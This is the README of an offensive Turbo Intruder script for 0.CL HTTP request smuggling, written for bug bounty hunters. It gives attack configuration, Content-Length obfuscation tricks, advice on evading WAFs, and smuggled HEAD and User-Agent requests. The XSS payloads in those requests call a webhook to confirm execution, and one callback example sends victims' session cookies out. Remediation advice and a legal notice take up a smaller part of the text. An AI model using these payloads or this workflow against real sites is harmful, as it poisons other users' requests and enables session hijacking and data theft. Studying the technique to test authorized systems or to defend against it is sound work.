# 0.CL Request Smuggling Tool

A Turbo Intruder script for detecting and exploiting 0.CL (zero Content-Length) HTTP request smuggling vulnerabilities with dual attack methods: **HEAD redirect technique** and **User-Agent XSS** with webhook callbacks.

## What is 0.CL Request Smuggling?

0.CL (zero Content-Length) request smuggling is an advanced HTTP desynchronization attack discovered by James Kettle. It exploits discrepancies in how servers parse Content-Length headers by using obfuscation techniques (spaces, tabs, duplicate headers) to cause frontend and backend servers to disagree about request boundaries.

This script implements a **double desync** attack that allows you to poison victim requests with XSS payloads that execute in their browsers and callback to your webhook server.

## 📚 Research Credit

Based on research by **James Kettle** (PortSwigger):
- [HTTP/1.1 Must Die](https://portswigger.net/research/http1-must-die)
- [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)

## ✨ Features

- 🎪 **Dual attack methods** - HEAD redirect (Kettle's technique) + User-Agent XSS
- 🎯 **Automatic method switching** - Alternates between techniques for maximum coverage
- 🪝 **Webhook callbacks** for out-of-band XSS confirmation
- 🔧 **Multiple Content-Length obfuscation** techniques
- 📊 **Real-time progress tracking** and success indicators
- 🛡️ **Rate limiting protection** with automatic delays
- 🔄 **Resource cycling** - Tests multiple static files automatically
- 🐛 **Bug bounty ready** with comprehensive PoC generation

## 🚀 Quick Start

### Prerequisites

- Burp Suite Professional (for Turbo Intruder)
- Python environment (bundled with Burp)
- A webhook service (Burp Collaborator, webhook.site, interact.sh)

### Installation

1. Download the `0cl_smuggling.py` script
2. Open Burp Suite
3. Send any request to Turbo Intruder (Right-click → Extensions → Turbo Intruder)
4. Paste the script into the editor

### Configuration

Edit the `CONFIG` dictionary at the top of the script:

```python
CONFIG = {
    # Your target
    'target_host': 'vulnerable-website.com',
    
    # Your webhook (GET THIS FIRST!)
    'webhook_url': 'https://YOUR-ID.oastify.com',
    
    # Attack method: 'both', 'head', or 'user-agent'
    'attack_method': 'both',  # Recommended: tests both techniques
    
    # Path that triggers early response
    'gadget_path': '/resources/css/anything',
    
    # Static resources for HEAD technique
    'head_static_resources': [
        '/static/app.js',
        '/static/main.css',
        '/js/main.js',
    ],
    
    # Target path for User-Agent technique
    'smuggled_path': '/',  # Default: homepage (always exists)
    
    # Number of attack attempts
    'attack_iterations': 100,
}
```

### Getting a Webhook

Choose one of these options:

**Option 1: Burp Collaborator (Recommended)**
```
1. In Burp Suite, go to: Burp menu → Burp Collaborator client
2. Click "Copy to clipboard"
3. Paste into 'webhook_url' in CONFIG
```

**Option 2: Webhook.site (Free)**
```
1. Visit https://webhook.site
2. Copy your unique URL
3. Paste into 'webhook_url' in CONFIG
```

**Option 3: Interact.sh (Free)**
```bash
curl -X POST https://interact.sh/register
# Use the returned URL in 'webhook_url'
```

### Running the Attack

1. Configure your target and webhook
2. Click "Attack" in Turbo Intruder
3. Watch the console output for success indicators
4. **Monitor your webhook for callbacks!**

## 🎯 Attack Methods

This script implements **two different exploitation techniques** and can use them individually or together:

### 1. HEAD Redirect Technique (Recommended)

**James Kettle's preferred method** - More reliable and cleaner exploitation.

#### How it works:
```http
HEAD /static/app.js?x=</script><script>fetch('webhook')</script> HTTP/1.1
Host: target.com
```

The server responds with a redirect:
```http
HTTP/1.1 301 Moved Permanently
Location: /static/app.js?x=</script><script>fetch('webhook')</script>
```

When the victim's browser processes this **Location header**, the XSS executes!

#### Advantages:
✅ **More reliable** - Doesn't depend on reflection in page content  
✅ **Works on static files** - Even pure HTML/CSS/JS files trigger redirects  
✅ **Cleaner exploitation** - XSS in Location header is more direct  
✅ **Better for bug bounties** - Clearer proof of concept  
✅ **Less WAF detection** - HEAD requests are less suspicious  

#### Configuration:
```python
'attack_method': 'head',
'head_static_resources': [
    '/static/app.js',    # Cycle through multiple resources
    '/css/main.css',     # Script tests each automatically
    '/js/bundle.js',
]
```

### 2. User-Agent XSS Technique (Fallback)

Classic approach using XSS in the User-Agent header.

#### How it works:
```http
GET / HTTP/1.1
Host: target.com
User-Agent: "/><script>fetch('webhook')</script>
```

The XSS payload executes when:
- Page reflects the User-Agent header
- Server logs are viewed by admins
- Analytics/monitoring displays the header

#### Advantages:
✅ **Works when HEAD is blocked** - Some servers filter HEAD requests  
✅ **Good for logged endpoints** - Admin panels often show request logs  
✅ **Targets specific paths** - Can smuggle to /admin, /profile, etc.  

#### Disadvantages:
❌ **Requires reflection** - Need to find a page that reflects User-Agent  
❌ **Encoding issues** - Headers often get sanitized  
❌ **More WAF detection** - User-Agent XSS is well-known  

#### Configuration:
```python
'attack_method': 'user-agent',
'smuggled_path': '/',        # Default: homepage
# Or target specific endpoints:
# 'smuggled_path': '/admin',
# 'smuggled_path': '/profile',
```

### 3. Both Techniques (Default)

**Recommended for bug bounty hunting** - Maximizes your chances of success.

```python
'attack_method': 'both',  # Alternates between HEAD and User-Agent
```

The script will:
1. Alternate between HEAD and User-Agent on each iteration
2. Cycle through all static resources for HEAD technique
3. Label each request so you know which method succeeded
4. Report successes for either technique

## 🔍 Finding Early Response Gadgets

An "early response gadget" is a path that returns a response before reading the full request body. Common candidates:

```
/static/*
/resources/*
/css/*
/js/*
/images/*
/assets/*
/media/*
/public/*
/cdn/*
/content/*
/fonts/*
/dist/*
```

### Testing for Gadgets

Send a POST request with a large Content-Length but no body:

```http
POST /static/test.css HTTP/1.1
Host: target.com
Content-Length: 100

```

If you get a response immediately (200, 404, 403) → **Potential gadget!**

### Finding Static Resources for HEAD Technique

1. Browse the target site normally
2. Open DevTools → Network tab
3. Look for loaded JS/CSS files
4. Add these paths to `head_static_resources`

Common patterns:
```python
'head_static_resources': [
    '/static/js/app.min.js',
    '/static/css/main.css',
    '/assets/bundle.js',
    '/dist/app.js',
    '/js/vendor.js',
]
```

## 🎪 Success Indicators

### Console Output

**HEAD Technique Success:**
```
[+] HEAD REDIRECT DETECTED!
[+] Status: 301
[!] Possible Location header with XSS payload
```

**User-Agent Technique Success:**
```
[+] POTENTIAL XSS DETECTED! (User-Agent technique)
[+] Indicator: "<script>"
[+] Status: 200
[!] CHECK YOUR WEBHOOK FOR CALLBACK!
```

**Either Technique:**
```
[+] SUCCESS! Webhook URL reflected! (HEAD technique)
[!] Monitor https://your-webhook.com for XSS callback
```

### Webhook Callback Examples

**HEAD technique callback:**
```
GET /?head=vulnerable-website.com
GET /?head=success
```

**User-Agent technique callback:**
```
GET /?xss=vulnerable-website.com
GET /?cookie=sessionid=abc123...
```

### Response Indicators

- Your webhook URL appears in victim response
- XSS payload reflected in HTML/headers
- Unusual status codes (403, 401, 500 on public endpoints)
- Redirects (301, 302, 307, 308) for HEAD requests
- Response length changes significantly

## ⚙️ Advanced Configuration

### Attack Method Selection

```python
# Try both techniques (recommended for discovery)
'attack_method': 'both'

# HEAD only (for production exploitation)
'attack_method': 'head'

# User-Agent only (when HEAD is blocked)
'attack_method': 'user-agent'
```

### Content-Length Obfuscation Techniques

```python
'content_length_obfuscation': 'space',   # Content-Length : %s
'content_length_obfuscation': 'tab',     # Content-Length\t: %s
'content_length_obfuscation': 'newline', # Content-Length\r\n : %s
'content_length_obfuscation': 'multiple', # Two CL headers
```

### Stage 2 Method Variations

```python
'stage2_method': 'OPTIONS',  # Default (least suspicious)
'stage2_method': 'GET',      # Try if OPTIONS fails
'stage2_method': 'POST',     # Last resort
```

### Attack Timing

```python
'concurrent_connections': 10,  # Parallel connections
'timeout': 15,                 # Request timeout in seconds
'attack_iterations': 100,      # Total attempts (-1 for infinite)
```

## 🐛 Troubleshooting

### No Callbacks Received (HEAD Technique)

1. **Verify static resources exist** - Check paths in browser
2. **Try different resources** - Add more to `head_static_resources`
3. **Check for redirects manually** - Test HEAD requests in Burp Repeater
4. **Some servers may not redirect HEAD** - Switch to User-Agent method

```python
# Test in Burp Repeater:
HEAD /static/app.js?test=1 HTTP/1.1
Host: target.com
```

### No Callbacks Received (User-Agent Technique)

1. **Target may not reflect User-Agent** - Try different `smuggled_path` values
2. **Headers might be sanitized** - Check if any headers are reflected
3. **Need delayed execution** - Admin logs viewed later might trigger XSS
4. **Switch to HEAD method** - More reliable for most targets

### Getting Rate Limited

```python
'concurrent_connections': 5,   # Reduce parallel connections
'attack_iterations': 20,       # Fewer attempts
```

Add manual delays in the code if needed.

### Timeouts

```python
'timeout': 30,                 # Increase timeout
'concurrent_connections': 5,   # Reduce load
```

### Gadget Not Working

- Try different paths (see "Finding Early Response Gadgets")
- Use Burp Repeater to manually test paths
- Look for paths that return quickly even with high Content-Length
- Check server behavior with different HTTP methods

### HEAD Requests Being Blocked

- Switch to `'attack_method': 'user-agent'`
- Some WAFs specifically filter HEAD to static resources
- User-Agent technique may work when HEAD doesn't

## 📊 Interpreting Results

### Strong Positive Indicators

✅ Webhook receives callback with domain/cookie  
✅ Console shows "SUCCESS!" or "DETECTED"  
✅ Webhook URL reflected in victim response  
✅ Response length changes significantly  
✅ 301/302 redirects with payload in Location (HEAD)  
✅ Unusual status codes (403 on public page)  

### Weak Indicators (Need More Testing)

⚠️ Single unusual status code  
⚠️ Response length varies slightly  
⚠️ Console warnings without webhook callback  

### False Positives

❌ Static reflection without execution  
❌ WAF/IDS blocking attempts (check response content)  
❌ Normal 404 responses  

## 🎓 Bug Bounty Tips

### Which Method to Report?

**HEAD Technique = Higher Impact**
- Cleaner exploitation path
- More universal (works on static files)
- Better proof of concept
- Usually receives higher severity ratings

**User-Agent Technique = Valid but Lower**
- Still a valid vulnerability
- May be rated lower due to reflection requirement
- Good fallback if HEAD doesn't work

### Responsible Disclosure

1. **Use harmless payloads** - Stick to `document.domain` callbacks
2. **Target your own sessions** - Don't poison production users
3. **Test during off-hours** - Minimize impact on real users
4. **Clean up** - Clear any poisoned cache entries
5. **Report immediately** - Don't exploit beyond PoC

### Writing the Report

Include:

- **Title**: "HTTP Request Smuggling via 0.CL Desync leading to XSS"
- **Severity**: High/Critical (can lead to account takeover)
- **Attack Method Used**: Specify HEAD or User-Agent technique
- **Steps to Reproduce**: Full Turbo Intruder setup
- **Proof of Concept**: Webhook callback screenshot
- **Impact**: Session hijacking, account takeover, data theft
- **Affected Endpoints**: List all vulnerable paths

### Sample Report Template

```markdown
## Summary
HTTP Request Smuggling vulnerability via 0.CL Content-Length desync 
leading to stored XSS affecting all users. Exploited using HEAD 
redirect technique on static resources.

## Vulnerability Details
The application is vulnerable to HTTP Request Smuggling due to 
Content-Length header parsing discrepancies between frontend and 
backend servers. By obfuscating the Content-Length header with a 
space character, I was able to smuggle a HEAD request to a static 
resource that poisoned subsequent victim requests with XSS payloads.

## Attack Method
I used the HEAD redirect technique where:
1. A smuggled HEAD request targets a static resource
2. The XSS payload is placed in the query parameter
3. The server redirects, placing the payload in the Location header
4. The victim's browser processes the Location header, executing the XSS

This is more reliable than User-Agent reflection as it works on 
static files without requiring any reflection points.

## Proof of Concept

### Configuration
- Target: vulnerable-website.com
- Early Response Gadget: /resources/css/anything
- Static Resource: /static/app.js
- Webhook: https://abc123.oastify.com

### Turbo Intruder Script
[Attach the full script with your configuration]

### Webhook Callback Screenshot
[Screenshot showing callback with domain name]

### Example Smuggled Request
```
HEAD /static/app.js?x=</script><script>fetch('https://abc123.oastify.com?xss='+document.domain)</script> HTTP/1.1
Host: vulnerable-website.com
```

## Steps to Reproduce
1. Configure Turbo Intruder with the attached script
2. Set target_host to vulnerable-website.com
3. Set webhook_url to your Burp Collaborator URL
4. Set attack_method to 'head'
5. Add '/static/app.js' to head_static_resources
6. Run attack for 50 iterations
7. Observe callback to webhook with victim's domain name

## Impact
**High/Critical Severity** - This vulnerability allows an attacker to:
- Execute arbitrary JavaScript in victim browsers
- Steal session tokens and cookies via `document.cookie`
- Perform actions on behalf of victims (CSRF)
- Redirect victims to malicious sites
- Exfiltrate sensitive data from the page
- Achieve account takeover through session hijacking
- Target administrators viewing poisoned requests in logs

The attack is particularly dangerous because:
- Works against any user visiting the site
- No user interaction required beyond visiting the site
- Affects multiple users (request poisoning)
- Difficult to detect without specific monitoring

## Affected URLs
- https://vulnerable-website.com/ (victim endpoint)
- https://vulnerable-website.com/resources/* (gadget)
- https://vulnerable-website.com/static/* (HEAD targets)

## Remediation
1. **Normalize Content-Length headers** - Strip all whitespace from header names
2. **Reject ambiguous requests** - Return 400 for requests with:
   - Duplicate Content-Length headers
   - Whitespace in header names
   - Unusual header formatting
3. **Upgrade to HTTP/2** - Eliminates CL-based smuggling vectors entirely
4. **Synchronize parsing** - Ensure frontend and backend use identical parsing logic
5. **Implement strict request validation** - Reject requests that don't meet RFC 7230
6. **Add security headers** - CSP to limit XSS impact

## References
- [James Kettle - HTTP/1.1 Must Die](https://portswigger.net/research/http1-must-die)
- [PortSwigger - Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [RFC 7230 - HTTP/1.1 Message Syntax](https://tools.ietf.org/html/rfc7230)
```

## 🛡️ Defense

If you're a developer protecting against this:

1. **Normalize headers** - Strip whitespace from header names/values
2. **Reject ambiguous requests** - Deny duplicate or malformed headers
3. **Use HTTP/2** - Eliminates CL-based smuggling vectors
4. **Synchronize parsing** - Ensure frontend/backend agreement
5. **Timeout early responses** - Don't send responses before reading full body
6. **Validate strictly** - Follow RFC 7230 exactly
7. **Monitor for attacks** - Log requests with unusual header formatting

## 🔄 Comparison: HEAD vs User-Agent

| Aspect | HEAD Technique | User-Agent Technique |
|--------|---------------|---------------------|
| **Reliability** | ⭐⭐⭐⭐⭐ High | ⭐⭐⭐ Medium |
| **Success Rate** | Works on most static files | Requires reflection point |
| **WAF Evasion** | ⭐⭐⭐⭐⭐ Excellent | ⭐⭐ Poor |
| **Bug Bounty Impact** | Higher severity ratings | Lower severity ratings |
| **Setup Complexity** | Find static resources | Find reflection points |
| **Execution Speed** | Immediate (redirect) | May be delayed (logs) |
| **Best For** | Initial discovery, PoC | Fallback, admin logs |

**Recommendation**: Always start with HEAD technique (`'attack_method': 'both'` or `'attack_method': 'head'`). Only use User-Agent if HEAD requests are blocked or filtered.

## ⚖️ Legal Notice

This tool is for **authorized security testing only**. Only use against:

- Your own systems
- Systems you have explicit written permission to test
- Bug bounty programs that permit this testing method

Unauthorized access to computer systems is illegal. Always follow:
- Bug bounty program rules
- Responsible disclosure guidelines
- Local computer crime laws

## 📖 Additional Resources

- [James Kettle's HTTP Desync Research](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/request-smuggling)
- [Turbo Intruder Documentation](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988)
- [HTTP Request Smuggling Tutorial](https://portswigger.net/web-security/request-smuggling/finding)
- [RFC 7230 - HTTP/1.1 Specification](https://tools.ietf.org/html/rfc7230)

## 🤝 Contributing

Found a bug or have improvements? Contributions welcome!

1. Fork the repository
2. Create a feature branch
3. Test thoroughly
4. Submit a pull request

## 📄 License

MIT License - See LICENSE file for details

## 🙏 Acknowledgments

- **James Kettle** - Original research, discovery, and HEAD redirect technique
- **PortSwigger** - Turbo Intruder tool and research platform
- Security community for continued research and improvements

---

**⚠️ Remember**: Always test ethically, get permission, and disclose responsibly!

**🎯 Pro Tip**: Start with `'attack_method': 'both'` and let the script test both techniques automatically. The HEAD method will likely succeed first!
